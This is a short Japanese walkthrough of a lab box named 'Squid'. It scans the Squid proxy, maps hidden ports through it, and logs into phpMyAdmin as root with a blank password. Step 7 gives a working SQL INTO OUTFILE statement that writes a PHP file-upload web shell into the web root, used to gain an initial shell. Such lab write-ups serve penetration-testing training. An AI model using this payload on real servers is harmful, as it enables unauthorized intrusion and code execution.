# Squid

## 手順
1. rustscanすると、squidプロキシサーバが開いていることが分かる。まずはこのsquidの特定バージョンをsearchsploitする。しかしエクスプロイトはヒットせず。
2. squidのプロキシにブラウザからアクセスすると、URLに到達できない風なエラーメッセージがブラウザに表示される。
3. [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid)を見ると、squidのエクスプロイト方法が色々書いてある。spose.pyというツールを使うと、proxychainsを使わずに、そのproxyの裏に隠れているポートを見ることができる。
4. sposeの結果を見ると、3306と8080が開いているのが分かる。ブラウザからアクセスするために、foxy proxyでターゲットホストのsquidをブラウザの使用するプロキシとして使用する。
5. ブラウザからアクセスすると3306はただのエラーメッセージなので、8080ポートにアクセスすると、wamp serverのページに到達できる。
6. するとphpinfoとphpmyadminのページに飛ぶリンクが見えるのでphpmyadminのログインページへ。rootユーザでパスワード空白でログインができてしまう。
7. rootでphpmyadminに入れているので調べると、SQLタブ経由でファイルをアップロードできる。以下のsql文を張り付けて実行すると、phpファイルを作成できる。
```.sql
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```
8. 作成したphpファイルはuploader.phpというファイルなので、そこからシェルファイルをアップロードして起動すれば初期シェルが取れる。
9. 権限昇格なしで終わり。